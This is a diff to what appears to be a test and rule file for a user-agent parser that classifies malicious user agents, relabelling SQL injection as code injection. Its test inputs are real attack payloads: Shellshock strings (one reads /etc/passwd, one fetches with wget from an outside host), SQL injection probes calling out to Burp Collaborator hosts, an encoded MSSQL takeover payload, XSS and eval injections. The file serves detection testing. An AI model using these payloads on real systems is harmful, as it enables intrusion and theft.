@@ -15,25 +15,7 @@
 # limitations under the License.
 #
 
-setSQLInjection: &setSQLInjection
-    - '__Set_ALL_Fields__                  :   999900 :"<<<null>>>"' # Must be 1 lower than the rest (or you will wipe yourself too)
-    - 'DeviceClass                         :  1000000 :"Hacker"'
-    - 'DeviceName                          :  1000000 :"Hacker"'
-    - 'DeviceBrand                         :  1000000 :"Hacker"'
-    - 'DeviceVersion                       :  1000000 :"Hacker"'
-    - 'OperatingSystemClass                :  1000000 :"Hacker"'
-    - 'OperatingSystemName                 :  1000000 :"Hacker"'
-    - 'OperatingSystemVersion              :  1000000 :"Hacker"'
-    - 'LayoutEngineClass                   :  1000000 :"Hacker"'
-    - 'LayoutEngineName                    :  1000000 :"Hacker"'
-    - 'LayoutEngineVersion                 :  1000000 :"Hacker"'
-    - 'AgentClass                          :  1000000 :"Hacker"'
-    - 'AgentName                           :  1000000 :"Hacker"'
-    - 'AgentVersion                        :  1000000 :"Hacker"'
-    - 'HackerAttackVector                  :  1000000 :"SQL Injection"'
-    - 'HackerToolkit                       :  1000000 :"<<<null>>>"'
-
-isSQLInjection: &isSQLInjection
+isCodeInjection: &isCodeInjection
       DeviceClass                          : 'Hacker'
       DeviceName                           : 'Hacker'
       DeviceBrand                          : 'Hacker'
@@ -56,42 +38,10 @@ isSQLInjection: &isSQLInjection
       AgentVersionMajor                    : 'Hacker'
       AgentNameVersion                     : 'Hacker'
       AgentNameVersionMajor                : 'Hacker'
-      HackerAttackVector                   : 'SQL Injection'
+      HackerAttackVector                   : 'Code Injection'
       HackerToolkit                        : 'Unknown'
 
 config:
-
-- matcher:
-    require:
-    - 'agent{"OR "'
-    extract: *setSQLInjection
-
-  # Sqlmap hacker
-
-- matcher:
-    require:
-    - 'agent.(1)product.name="sqlmap"'
-    extract:
-    - 'DeviceClass                         :    10010 :"Hacker"'
-    - 'DeviceName                          :    10010 :"Hacker"'
-    - 'DeviceBrand                         :    10010 :"Hacker"'
-    - 'DeviceVersion                       :    10010 :"Hacker"'
-    - 'OperatingSystemClass                :    10010 :"Hacker"'
-    - 'OperatingSystemName                 :    10010 :"Hacker"'
-    - 'OperatingSystemVersion              :    10010 :"Hacker"'
-    - 'OperatingSystemNameVersion          :    10010 :"Hacker"'
-    - 'LayoutEngineClass                   :    10010 :"Hacker"'
-    - 'LayoutEngineName                    :    10010 :"Hacker"'
-    - 'LayoutEngineVersion                 :    10010 :"Hacker"'
-    - 'LayoutEngineVersionMajor            :    10010 :"Hacker"'
-    - 'AgentClass                          :    10010 :"Hacker"'
-    - 'AgentName                           :    10010 :"Hacker"'
-    - 'AgentVersion                        :    10010 :"Hacker"'
-    - 'AgentVersionMajor                   :    10010 :"Hacker"'
-    - 'HackerAttackVector                  :    10010 :"SQL Injection"'
-    - 'HackerToolkit                       :    10010 :"Sqlmap"'
-    - 'AgentNameVersion                    :    10010 :"Hacker"'
-    - 'AgentNameVersionMajor               :    10010 :"Hacker"'
 
 - test:
     input:
@@ -120,288 +70,489 @@ config:
       AgentNameVersion                     : 'Hacker'
       AgentNameVersionMajor                : 'Hacker'
       AgentInformationUrl                  : 'http://sqlmap.org'
-      HackerAttackVector                   : 'SQL Injection'
+      HackerAttackVector                   : 'Code Injection'
       HackerToolkit                        : 'Sqlmap'
 
 - test:
     input:
+      user_agent_string: '() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((97+19))\"; }'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '('''') { :;}; wget http://whsec.us/20147169/10000646/ff16d94243 #, Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1 WhiteHat Security'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: 'shellshocker=''() { wget http://yourschool.net/.tmp/frogclog.php?http://www.example.com/foo/bar/; }'' bash -c shellshocker'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: 'Mozilla/4.0 ()<script>alert(''Compatible'')</script>; <script>alert(''''OS)</script>; <script>alert(''MSIE 6.0'')</script>; ()'
+    expected: *isCodeInjection
+
+- test:
+    input:
       user_agent_string: '(select convert(int,CHAR(65)))'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '(UPDATEXML(2046,CONCAT(0x2e,0x716b6a7671,(SELECT (ELT(2046=2046,1))),0x717a767671),5014))'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '"-9929%\"" UNION ALL SELECT 2175,2175,2175,2175,2175,2175,2175,2175,2175-- nMgE"'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '"-4871%\"") ORDER BY 9174-- kbLJ"'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7) ORDER BY 1-- WiRj'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '"-9937\"" OR 5496=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (5496=5496) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(118)||CHR(118)||CHR(113))"'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '(SELECT * FROM GENERATE_SERIES(3440,3440,CASE WHEN (3440=3121) THEN 1 ELSE 0 END) LIMIT 1)'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: 'SELECT ''qkjvq''||(CASE 5935 WHEN 5935 THEN 1 ELSE 0 END)||''qzvvq'' FROM RDB$DATABASE'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '"(select extractvalue(xmltype(''<?xml version=\""1.0\"" encoding=\""UTF-8\""?><!DOCTYPE root [ <!ENTITY % izjvh SYSTEM \""http://u61vg2dwm0t6imbnq61n556eh5nygq4tsofe33.burpcollab''||''orator.net/\"">%izjvh;]>''),''/l'') from dual)"'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '"(select(0)from(select(sleep(3)))v)/*''+(select(0)from(select(sleep(3)))v)+''\""+(select(0)from(select(sleep(3)))v)+\""*/"'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: 'or 1=1--'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: ''' or 1=1--'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0'')waitfor delay''0:0:20''--'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0'' waitfor delay''0:0:20''--'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.028425714'' or 6457=6458--'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.028425714'' or ''6457''=''6458'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.028425714'' or 6457=6457--'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.028425714'' or ''6457''=''6457'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0'',0)waitfor delay''0:0:20''--'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7) WHERE 9307=9307 OR NOT 1515=2173-- pJBA'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7` WHERE 9265=9265 OR NOT 1412=6831-- yPtW'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7'' WHERE 8348=8348 OR NOT 7373=6149-- QoIW'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7%''))) OR NOT 9785=9785 AND (((''%''='''
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7'') AS GMQU WHERE 3635=3635 OR NOT 9785=9785-- RlPe'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '-7928'') AS oPZe WHERE 1230=1230 OR MAKE_SET(2577=2472,2472)--'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '-8434))) OR 9695 IN ((CHAR(113)+CHAR(107)+CHAR(106)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (9695=9695) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(118)+CHAR(113))) AND (((4283=4283'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '"-8250\"" OR 8313=5806#"'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '-1 OR 2+933-933-1=0+0+0+1'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '-1'' OR 2+845-845-1=0+0+0+1 or ''WW2E86AF''='''
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
-      user_agent_string: 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'';declare @q varchar(99);set @q=''\\\\0861i8f2o6vcksdtsc3t7b8kjbp4ix6oxcszin7.burpcollab''+''orator.net\\gay''; exec master.dbo.xp_dirtree @q;--'
-    expected: *isSQLInjection
+      user_agent_string: 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'';declare @q varchar(99);set @q=''\\\\1xx2hack3host4xx5.burpcollab''+''orator.net\\gay''; exec master.dbo.xp_dirtree @q;--'
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0)'';exEcute(''dec''+''lare @zb varchar(8000)se''+''t @zb=0x657865632073705F636F6E6669677572655B73686F7720616476616E636564206F7074696F6E735D2C313B5245434F4E4649475552452057495448204F564552524944453B657865632073705F636F6E6669677572655B416420486F6320446973747269627574656420517565726965735D2C313B5245434F4E4649475552452057495448204F564552524944453B757064617465206F70656E726F77736574282773716C6F6C656462272C277365727665723D3132342E3131342E3135312E38373B7569643D73613B7077643D77656B6532303134272C2773656C656374202A2066726F6D206D61737465722E2E696E6A2077686572652075726C5F663D27277777772E6173766164746F72696E6F2E6F7267272727297365742074703D27686F7374272C697361646D696E3D49535F535256524F4C454D454D424552282773797361646D696E27292C697364626F776E65723D49535F4D454D424552282764625F6F776E657227292C6973696E6A3D31;exEcUte(@zb)'')--'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '-8067)) AS trzU WHERE 3801=3801 OR MAKE_SET(7172=7172,6095)--'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '-2734'')) AS YnXr WHERE 1760=1760 OR MAKE_SET(7172=7172,6095)--'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '-3358''))) OR MAKE_SET(9429=7340,7340) AND (((''QIPX'' LIKE ''QIPX'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '-3596''))) OR MAKE_SET(7172=7172,6095) AND (((''CIqS'' LIKE ''CIqS'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '-8939'')) AS nIoD WHERE 8404=8404 OR MAKE_SET(6157=2589,2589)--'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '-9639''))) OR 4729=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (4729=4729) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(118)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND (((''jLCJ'' LIKE ''jLCJ'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '-1 OR 2+347-347-1=0+0+0+1'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '-1 OR 2+150-150-1=0+0+0+1 --'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '-9987%'' OR 5271=5271 AND ''%''='''
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '-9992'' OR 8054=CTXSYS.DRITHSX.SN(8054,(CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (8054=8054) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(118)||CHR(118)||CHR(113))) AND ''YmZM'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '"-9998\"" OR 5520=(''qkjvq''||(SELECT CASE 5520 WHEN 5520 THEN 1 ELSE 0 END FROM RDB$DATABASE)||''qzvvq'') AND \""frsm\"" LIKE \""frsm"'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '9Sc35aAu''));select pg_sleep(9); --'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '8JInzfdL''; waitfor delay ''0:0:6'' --'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '8KMHl9gr'';select pg_sleep(3); --'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '"-8881\"" OR MAKE_SET(7172=7172,6095) AND \""HpsH\""=\""HpsH"'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '-8652 OR 4729=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (4729=4729) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(118)||CHR(118)||CHR(1'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '(CASE WHEN 6209=6209 THEN 6209 ELSE NULL END)'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '(CASE WHEN 8578=7618 THEN 8578 ELSE NULL END)'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '(CAST((CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (1300=1300) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(118)||CHR(118)||CHR(113)) AS NUMERIC))'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '(CAST((CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113))||(SELECT 1 FROM GENERATE_SERIES(9085,9085,CASE WHEN (9085=9085) THEN 1 ELSE 0 END) LIMIT 1)::text||(CHR(113)||CHR(122)||CHR(118)||CHR(118)||CHR(113)) AS NUMERIC))'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '(CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(106)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (3384=3384) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(118)+CHAR(113))))'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '(EXTRACTVALUE(6481,CONCAT(0x5c,0x716b6a7671,(SELECT (ELT(6481=6481,1))),0x717a767671)))'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '(SELECT (CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (9479=9479) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(118)||CHR(118)||CHR(113)))'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '(SELECT (CASE WHEN (9814=1041) THEN CHAR(115)+CHAR(113)+CHAR(108)+CHAR(109)+CHAR(97)+CHAR(112)+CHAR(47)+CHAR(49)+CHAR(46)+CHAR(48)+CHAR(45)+CHAR(100)+CHAR(101)+CHAR(118)+CHAR(45)+CHAR(110)+CHAR(111)+CHAR(110)+CHAR(103)+CHAR(105)+CHAR(116)+CHAR(45)+CHAR(50)+CHAR(48)+CHAR(49)+CHAR(53)+CHAR(48)+CHAR(57)+CHAR(48)+CHAR(57)+CHAR(32)+CHAR(40)+CHAR(104)+CHAR(116)+CHAR(116)+CHAR(112)+CHAR(58)+CHAR(47)+CHAR(47)+CHAR(115)+CHAR(113)+CHAR(108)+CHAR(109)+CHAR(97)+CHAR(112)+CHAR(46)+CHAR(111)+CHAR(114)+CHAR(103)+CHAR(41) ELSE 9814*(SELECT 9814 FROM master..sysdatabases) END))'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
 
 - test:
     input:
       user_agent_string: '"-3563\"" OR ELT(6900=6900,1436)"'
-    expected: *isSQLInjection
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36''||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),12)||'''
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36'';declare @q varchar(99);set @q=''\\\\1xx2hack3host4xx5.burpcollab''+''orator.net\\lxh''; exec master.dbo.xp_dirtree @q;--'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36''||(select extractvalue(xmltype(''<?xml version=\""1.0\"" encoding=\""UTF-8\""?><!DOCTYPE root [ <!ENTITY % fffol SYSTEM \""http://1xx2hack3host4xx5.burpcollab''||''orator.net/\"">%fffol;]>''),''/l'') from dual)||''"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36''+(select load_file(''\\\\\\\\1xx2hack3host4xx5.burpcollaborator.net\\\\lui''))+'''
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0''+(function(){if(typeof t6vnd===\""undefined\""){var a=new Date();do{var b=new Date();}while(b-a<20000);t6vnd=1;}}())+''"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"(select extractvalue(xmltype(''<?xml version=\""1.0\"" encoding=\""UTF-8\""?><!DOCTYPE root [ <!ENTITY % hcgxu SYSTEM \""http://1xx2hack3host4xx5.burpcollab''||''orator.net/\"">%hcgxu;]>''),''/l'') from dual)"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36''+(function(){if(typeof loswd===\""undefined\""){var a=new Date();do{var b=new Date();}while(b-a<20000);loswd=1;}}())+''"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '() { _; } >_[$($())] { echo; /bin/sleep 5; }'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \""bash_cve_2014_6278 Output : $((0+66))\""; }"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \""bash_cve_2014_6278 Output : $((89+30))\""; }"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '$(nslookup H300Q4fO)'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"$(nslookup 1xx2hack3host4xx5.bxss.me||perl -e \""gethostbyname(''1xx2hack3host4xx5.bxss.me'')\"")"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${@print(md5(31337))}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${@print(md5(31337))}\\'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${@print(md5(acunetix_wvs_security_test))}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${@print(md5(acunetix_wvs_security_test))}\\'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '0''XOR(if(now()=sysdate(),sleep(12),0))XOR''Z'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"0\""XOR(if(now()=sysdate(),sleep(12),0))XOR\""Z"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '-1'' OR 2+200-200-1=0+0+0+1 or ''9CGqyquE''='''
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '-1 OR 2+202-202-1=0+0+0+1 --'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"-1\"" OR 2+212-212-1=0+0+0+1 --"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '-1 OR 2+213-213-1=0+0+0+1'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '-1'' OR 2+217-217-1=0+0+0+1 --'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"-1\"" OR 2+220-220-1=0+0+0+1 --"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '-1 OR 2+23-23-1=0+0+0+1'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: 'Frtpdz8b'')) OR 782=(SELECT 782 FROM PG_SLEEP(15))--'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '() { :; }; echo; echo; /bin/bash -c ''cat /etc/passwd;'''
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '() { :; }; echo; echo; /bin/bash -c ''echo 000da979bec54550b74f917565e4c3c4 | base64'''
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '() { :; }; echo; echo; /bin/bash -c ''nslookup p-55.1xx2hack3host4xx5.test.if1.pw || dig p-55.1xx2hack3host4xx5.test.if1.pw'''
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '$(sleep 11)'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '''+''A''.concat(70-3).concat(22*4).concat(114).concat(79).concat(120).concat(87)+(require''socket'' Socket.gethostbyname(''hitjn''+''1xx2hack3host4xx5.bxss.me.'')[3].to_s)+'''
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '""+""A"".concat(70-3).concat(22*4).concat(99).concat(76).concat(110).concat(68)+(require""socket"" Socket.gethostbyname(""hitht""+""1xx2hack3host4xx5.bxss.me."")[3].to_s)+""'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: 'eval(compile(''for x in range(1):\\n import time\\n time.sleep(20)'',''a'',''single''))'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: 'if(now()=sysdate(),sleep(16.035),0)'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"javascript:/*</script><svg/onload=''+/\""/+/onmouseover=1/+/[*/[]/+((new(Image)).src=([]+/\\/1xx2hack3host4xx5\\.burpcollaborator.net/).replace(/\\\\/g,[]))//''>"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: 'Jfeza4FE'';select pg_sleep(3); --'
+    expected: *isCodeInjection
+
 
 # Validate false positive edge case that matched the substring "OR NOT" in "honOR NOTe 8"
 - test:
